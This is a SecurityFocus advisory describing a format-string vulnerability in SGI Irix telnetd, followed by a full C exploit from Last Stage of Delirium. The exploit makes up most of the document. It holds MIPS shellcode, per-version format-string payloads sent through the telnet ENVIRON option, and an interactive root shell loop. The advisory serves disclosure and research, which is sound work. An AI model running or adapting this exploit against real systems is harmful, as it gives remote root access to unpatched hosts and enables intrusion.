source: http://www.securityfocus.com/bid/1572/info

A vulnerability exists in the telnet daemon shipped with Irix versions 6.2 through 6.5.8, and in patched versions of the telnet daemon in Irix 5.2 through 6.1, from Silicon Graphics (SGI). The telnetd will blindly use data passed by the user in such a way as to make it possible for a remote attacker to execute arbitrary commands with the privileges of the daemon. In the case of the telnet daemon, this is root privileges.

The telnet daemon, upon receiving a request via IAB-SB-TELOPT_ENVIRON request to set one of the _RLD environment variables, will log this attempt via syslog(). The data normally logged is the environment variable name, and the value of the environment variable. The call to syslog, however, uses the supplied variables as part of the format string. By carefully constructing the contents of these variables, it is possible to overwrite values on the stack such that supplied code may be executed as the root user.

This vulnerability does not exist in unpatched versions of Irix 5.2 through 6.1. It was introduced in these versions via patches designed to address the vulnerability outlined in CERT advisory CA-95:14. This was addressed in the 1010 and 1020 series of patches. If these patches are not installed, the system is not vulnerable to this specific attack.


/*## copyright LAST STAGE OF DELIRIUM jul 2000 poland        *://lsd-pl.net/ #*/
/*## telnetd                                                                 #*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

char shellcode[]=
    "\x04\x10\xff\xff"             /* bltzal  $zero,<shellcode>    */
    "\x24\x02\x03\xf3"             /* li      $v0,1011             */
    "\x23\xff\x02\x14"             /* addi    $ra,$ra,532          */
    "\x23\xe4\xfe\x08"             /* addi    $a0,$ra,-504         */
    "\x23\xe5\xfe\x10"             /* addi    $a1,$ra,-496         */
    "\xaf\xe4\xfe\x10"             /* sw      $a0,-496($ra)        */
    "\xaf\xe0\xfe\x14"             /* sw      $zero,-492($ra)      */
    "\xa3\xe0\xfe\x0f"             /* sb      $zero,-497($ra)      */
    "\x03\xff\xff\xcc"             /* syscall                      */
    "/bin/sh"
;

typedef struct{char *vers;}tabent1_t;
typedef struct{int flg,len;int got,g_ofs,subbuffer,s_ofs;}tabent2_t;

tabent1_t tab1[]={
    { "IRIX 6.2  libc.so.1: no patches      telnetd: no patches          " },
    { "IRIX 6.2  libc.so.1: 1918|2086       telnetd: no patches          " },
    { "IRIX 6.2  libc.so.1: 3490|3723|3771  telnetd: no patches          " },
    { "IRIX 6.2  libc.so.1: no patches      telnetd: 1485|2070|3117|3414 " },
    { "IRIX 6.2  libc.so.1: 1918|2086       telnetd: 1485|2070|3117|3414 " },
    { "IRIX 6.2  libc.so.1: 3490|3723|3771  telnetd: 1485|2070|3117|3414 " },
    { "IRIX 6.3  libc.so.1: no patches      telnetd: no patches          " },
    { "IRIX 6.3  libc.so.1: 2087            telnetd: no patches          " },
    { "IRIX 6.3  libc.so.1: 3535|3737|3770  telnetd: no patches          " },
    { "IRIX 6.4  libc.so.1: no patches      telnetd: no patches          " },
    { "IRIX 6.4  libc.so.1: 3491|3769|3738  telnetd: no patches          " },
    { "IRIX 6.5-6.5.8m 6.5-6.5.7f           telnetd: no patches          " },
    { "IRIX 6.5.8f                          telnetd: no patches          " }
};

tabent2_t tab2[]={
    { 0, 0x56, 0x0fb44390, 115, 0x7fc4d1e0, 0x14 },
    { 0, 0x56, 0x0fb483b0, 117, 0x7fc4d1e0, 0x14 },
    { 0, 0x56, 0x0fb50490, 122, 0x7fc4d1e0, 0x14 },
    { 0, 0x56, 0x0fb44390, 115, 0x7fc4d220, 0x14 },
    { 0, 0x56, 0x0fb483b0, 117, 0x7fc4d220, 0x14 },
    { 0, 0x56, 0x0fb50490, 122, 0x7fc4d220, 0x14 },
    { 0, 0x56, 0x0fb4fce0, 104, 0x7fc4d230, 0x14 },
    { 0, 0x56, 0x0fb4f690, 104, 0x7fc4d230, 0x14 },
    { 0, 0x56, 0x0fb52900, 104, 0x7fc4d230, 0x14 },
    { 1, 0x5e, 0x0fb576d8,  88, 0x7fc4cf70, 0x1c },
    { 1, 0x5e, 0x0fb4d6dc, 102, 0x7fc4cf70, 0x1c },
    { 1, 0x5e, 0x7fc496e8,  77, 0x7fc4cf98, 0x1c },
    { 1, 0x5e, 0x7fc496e0,  77, 0x7fc4cf98, 0x1c }
};

char env_value[1024];

int prepare_env(int vers){
    int i,adr,pch,adrh,adrl;
    char *b;

    pch=tab2[vers].got+(tab2[vers].g_ofs*4);
    adr=tab2[vers].subbuffer+tab2[vers].s_ofs;
    adrh=(adr>>16)-tab2[vers].len;
    adrl=0x10000-(adrh&0xffff)+(adr&0xffff)-tab2[vers].len;

    b=env_value;
    if(!tab2[vers].flg){
        for(i=0;i<1;i++) *b++=' ';
        for(i=0;i<4;i++) *b++=(char)(htonl(pch)>>((3-i%4)*8))&0xff;
        for(i=0;i<4;i++) *b++=(char)(htonl(pch+2)>>((3-i%4)*8))&0xff;
        for(i=0;i<3;i++) *b++=' ';
        for(i=0;i<strlen(shellcode);i++){
            *b++=shellcode[i];
            if((shellcode[i]==0x02)||(shellcode[i]==0xff)) *b++=shellcode[i]; 
        }
        sprintf(b,"%%%05dc%%22$hn%%%05dc%%23$hn",adrh,adrl);
    }else{
        for(i=0;i<5;i++) *b++=' ';
        for(i=0;i<4;i++) *b++=(char)(htonl(pch)>>((3-i%4)*8))&0xff;
        for(i=0;i<4;i++) *b++=' ';
        for(i=0;i<4;i++) *b++=(char)(htonl(pch+2)>>((3-i%4)*8))&0xff;
        for(i=0;i<3;i++) *b++=' ';
        for(i=0;i<strlen(shellcode);i++){
            *b++=shellcode[i];
            if((shellcode[i]==0x02)||(shellcode[i]==0xff)) *b++=shellcode[i]; 
        }
        sprintf(b,"%%%05dc%%11$hn%%%05dc%%12$hn",adrh,adrl);
    }
    b+=strlen(b);
    return(b-env_value);
}

main(int argc,char **argv){
    char buffer[1024];
    int i,c,sck,il,ih,cnt,vers=65;
    struct hostent *hp;
    struct sockaddr_in adr;

    printf("copyright LAST STAGE OF DELIRIUM jul 2000 poland  //lsd-pl.net/\n");
    printf("telnetd for irix 6.2 6.3 6.4 6.5 6.5.8 IP:all\n\n");

    if(argc<2){
        printf("usage: %s address [-v 62|63|64|65]\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"sc:p:v:"))!=-1){
        switch(c){
        case 'v': vers=atoi(optarg);
        }
    }   

    switch(vers){
    case 62: il=0;ih=5; break;
    case 63: il=6;ih=8; break;
    case 64: il=9;ih=10; break;
    case 65: il=11;ih=12; break;
    default: exit(-1);
    }

    for(i=il;i<=ih;i++){
        printf(".");fflush(stdout);
        sck=socket(AF_INET,SOCK_STREAM,0);
        adr.sin_family=AF_INET;
        adr.sin_port=htons(23);
        if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if((hp=gethostbyname(argv[1]))==NULL){
                errno=EADDRNOTAVAIL;perror("error");exit(-1);
            }
            memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
        }
 
        if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){
            perror("error");exit(-1);
        }

        cnt=prepare_env(i);
        memcpy(buffer,"\xff\xfa\x24\x00\x01\x58\x58\x58\x58\x00",10);
        sprintf(&buffer[10],"%s\xff\xf0",env_value);
        write(sck,buffer,10+cnt+2);
        sleep(1);
        memcpy(buffer,"\xff\xfa\x24\x00\x01\x5f\x52\x4c\x44\x00%s\xff\xf0",10);
        sprintf(&buffer[10],"%s\xff\xf0",env_value);
        write(sck,buffer,10+cnt+2);

        if(((cnt=read(sck,buffer,sizeof(buffer)))<2)||(buffer[0]!=0xff)){
            printf("error: telnet service seems to be used with tcp wrapper\n");
            exit(-1);
        }

        write(sck,"/bin/uname -a\n",14);
        if((cnt=read(sck,buffer,sizeof(buffer)))>0){
            printf("\n%s\n\n",tab1[i].vers);
            write(1,buffer,cnt);
            break;
        }
        close(sck);
    }
    if(i>ih) {printf("\nerror: not vulnerable\n");exit(-1);}

    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}